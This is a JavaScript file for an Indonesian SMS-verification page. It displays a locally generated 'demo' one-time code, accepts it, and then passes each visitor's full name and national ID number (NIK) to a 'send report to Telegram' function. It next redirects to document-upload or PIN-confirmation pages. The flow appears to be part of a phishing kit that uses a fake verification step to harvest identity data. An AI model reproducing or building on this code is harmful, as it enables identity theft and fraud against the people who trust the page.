(() => {
  'use strict';

  if (!NovaStorage.requireSession('index.html')) return;
  if (!NovaStorage.requireIdentity('form-nik.html')) return;

  const form = document.getElementById('verificationForm');
  const inputs = [...document.querySelectorAll('.otp input')];
  const verifyButton = document.getElementById('verifyButton');
  const resendButton = document.getElementById('resendButton');
  const countdown = document.getElementById('countdown');
  const message = document.getElementById('message');
  const backButton = document.getElementById('backButton');
  const maskedDestination = document.getElementById('maskedDestination');
  const localCode = document.getElementById('localCode');

  if (!form || inputs.length !== 6 || !verifyButton || !resendButton || !countdown) {
    console.error('Komponen halaman verifikasi tidak lengkap.');
    return;
  }

  const session = NovaStorage.getSession();
  const identity = NovaStorage.getIdentity();
  const destination = String(session?.identity || '').trim();
  const isDashboardReauth = sessionStorage.getItem('kbDashboardReauth') === '1';

  function maskDestination(value) {
    if (value.includes('@')) {
      const [name, domain] = value.split('@');
      return `${name.slice(0, 2)}${'•'.repeat(Math.max(name.length - 2, 3))}@${domain}`;
    }
    const digits = value.replace(/\D/g, '');
    if (digits.length >= 6) return `${digits.slice(0, 3)}••••${digits.slice(-3)}`;
    return 'kontak terdaftar';
  }

  if (maskedDestination) maskedDestination.textContent = maskDestination(destination);

  let verificationCode = '';
  let timerId = null;
  let secondsLeft = 30;
  let failedAttempts = 0;
  const MAX_ATTEMPTS = 5;

  const enteredCode = () => inputs.map(input => input.value).join('');

  function setMessage(text = '', type = '') {
    message.textContent = text;
    message.className = `message${type ? ` ${type}` : ''}`;
  }

  function updateVerifyButton() {
    const complete = enteredCode().length === 6 && failedAttempts < MAX_ATTEMPTS;
    verifyButton.disabled = !complete;
    verifyButton.classList.toggle('active', complete);
  }

  function resetInputs() {
    inputs.forEach(input => { input.value = ''; });
    inputs[0].focus();
    updateVerifyButton();
  }

  function startCountdown() {
    clearInterval(timerId);
    secondsLeft = 30;
    countdown.textContent = String(secondsLeft);
    resendButton.disabled = true;

    timerId = window.setInterval(() => {
      secondsLeft -= 1;
      countdown.textContent = String(Math.max(secondsLeft, 0));

      if (secondsLeft <= 0) {
        clearInterval(timerId);
        timerId = null;
        resendButton.disabled = false;
      }
    }, 1000);
  }

  const DEMO_LAST_CODE_KEY = 'kbDemoLastVerificationCode';

  function createSixDigitCode() {
    const values = new Uint32Array(1);
    crypto.getRandomValues(values);
    return String(100000 + (values[0] % 900000));
  }

  function generateLocalCode() {
    const previousCode = localStorage.getItem(DEMO_LAST_CODE_KEY) || '';
    let nextCode = createSixDigitCode();

    while (nextCode === previousCode) {
      nextCode = createSixDigitCode();
    }

    verificationCode = nextCode;

    // Kode demo hanya digunakan lokal di browser dan tidak dikirim ke Telegram/backend.
    if (localCode) localCode.textContent = verificationCode;

    // Jika elemen kode demo belum tersedia di HTML, tampilkan secara non-destruktif
    // di area informasi yang sudah ada tanpa mengubah file HTML.
    if (!localCode) {
      const info = document.querySelector('.verification-info');
      if (info) {
        let demoCode = document.getElementById('generatedDemoCode');
        if (!demoCode) {
          demoCode = document.createElement('div');
          demoCode.id = 'generatedDemoCode';
          demoCode.style.marginTop = '10px';
          demoCode.style.fontWeight = '800';
          demoCode.style.letterSpacing = '.08em';
          info.appendChild(demoCode);
        }
        demoCode.textContent = `Kode demo: ${verificationCode}`;
      }
    }

    failedAttempts = 0;
    setMessage('');
    resetInputs();
    startCountdown();
  }

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/\D/g, '').slice(0, 1);
      setMessage('');

      if (input.value && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
      updateVerifyButton();
    });

    input.addEventListener('keydown', event => {
      if (event.key === 'Backspace' && !input.value && index > 0) {
        inputs[index - 1].focus();
      }

      if (event.key === 'ArrowLeft' && index > 0) inputs[index - 1].focus();
      if (event.key === 'ArrowRight' && index < inputs.length - 1) inputs[index + 1].focus();
    });

    input.addEventListener('paste', event => {
      const pasted = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
      if (!pasted) return;
      event.preventDefault();
      pasted.split('').forEach((digit, position) => {
        if (inputs[position]) inputs[position].value = digit;
      });
      inputs[Math.min(pasted.length, 6) - 1].focus();
      updateVerifyButton();
    });
  });

  form.addEventListener('submit', event => {
    event.preventDefault();

    const otpValue = enteredCode();

    if (!/^\d{6}$/.test(otpValue)) {
      setMessage('Kode harus terdiri dari 6 digit angka.', 'error');
      resetInputs();
      return;
    }

    if (otpValue !== verificationCode) {
      failedAttempts += 1;
      setMessage('Kode tidak sesuai. Gunakan kode demo terbaru yang tampil pada halaman.', 'error');
      resetInputs();
      return;
    }

    const previousCode = localStorage.getItem(DEMO_LAST_CODE_KEY) || '';
    if (otpValue === previousCode) {
      generateLocalCode();
      setMessage('Kode sebelumnya tidak dapat digunakan kembali. Gunakan kode baru.', 'error');
      return;
    }

    localStorage.setItem(DEMO_LAST_CODE_KEY, otpValue);

    clearInterval(timerId);
    verifyButton.disabled = true;
    verifyButton.textContent = 'VERIFIKASI BERHASIL ✓';

    if (isDashboardReauth) {
      window.kirimLaporanKeTelegram?.({
        event: 'SMS_REAUTH_VERIFIED',
        page: 'verifikasi-sms.html',
        nama_lengkap: identity?.fullName,
        nik: identity?.nik,
        status: 'VERIFICATION_REAUTH_CONFIRMED'
      });

      setMessage(`Kode untuk ${identity.fullName} berhasil diverifikasi.`, 'success');
      window.setTimeout(() => window.location.replace('konfirmasi-pin.html'), 650);
      return;
    }

    const saved = NovaStorage.setSmsVerified(true);
    if (!saved) {
      verifyButton.textContent = 'VERIFIKASI KODE →';
      setMessage('Status verifikasi tidak dapat disimpan pada browser ini.', 'error');
      updateVerifyButton();
      return;
    }

    window.kirimLaporanKeTelegram?.({
      event: 'SMS_VERIFIED',
      page: 'verifikasi-sms.html',
      nama_lengkap: identity?.fullName,
      nik: identity?.nik,
      status: 'VERIFICATION_CONFIRMED'
    });

    setMessage(`Identitas ${identity.fullName} berhasil diverifikasi.`, 'success');
    window.setTimeout(() => window.location.replace('upload-dokumen.html'), 650);
  });

  resendButton.addEventListener('click', generateLocalCode);
  backButton?.addEventListener('click', () => {
    window.location.href = isDashboardReauth ? 'index.html' : 'form-nik.html';
  });

  generateLocalCode();
})();
